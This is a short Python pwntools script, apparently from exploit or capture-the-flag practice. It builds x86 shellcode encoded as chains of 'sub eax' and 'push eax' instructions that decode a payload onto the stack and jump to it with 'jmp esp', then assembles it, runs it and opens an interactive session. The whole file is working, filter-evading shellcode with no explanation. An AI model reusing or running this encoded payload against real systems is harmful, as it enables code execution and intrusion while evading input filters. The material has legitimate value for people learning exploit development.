from pwn import *

shellcode = "push esp; pop eax; sub eax, 0x32323232; sub eax, 0x76766376; sub eax, 0x57576e68; push eax; pop esp;; push 0x41414141; pop eax; sub eax, 0x34343434; sub eax, 0x34783434; sub eax, 0x25783478; sub eax, 0x324f4c56; push eax; sub eax, 0x70707070; sub eax, 0x70427070; sub eax, 0x3548454a; push eax; sub eax, 0x77357777; sub eax, 0x39257739; sub eax, 0x31256230; push eax; sub eax, 0x68686868; sub eax, 0x42686868; sub eax, 0x42394268; sub eax, 0x43436378; push eax; sub eax, 0x33727972; sub eax, 0x25307972; sub eax, 0x3730766c; push eax; sub eax, 0x71337171; sub eax, 0x77333337; sub eax, 0x77583825; push eax; sub eax, 0x44444444; sub eax, 0x31444444; sub eax, 0x31724444; sub eax, 0x41765667; push eax; sub eax, 0x52525252; sub eax, 0x52525252; sub eax, 0x62794362; sub eax, 0x787a3572; push eax; sub eax, 0x34793679; sub eax, 0x39562579; sub eax, 0x25302568; push eax; sub eax, 0x73737373; sub eax, 0x4c4c734c; sub eax, 0x46364c41; push eax; sub eax, 0x72724444; sub eax, 0x72444a4a; sub eax, 0x54543837; push eax; sub eax, 0x38727272; sub eax, 0x66656568; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; push eax; jmp esp;"


bytes = asm(shellcode)
print(bytes)
print(len(bytes))
#p = gdb.debug_assembly(shellcode)
p = run_shellcode(bytes)
p.interactive()
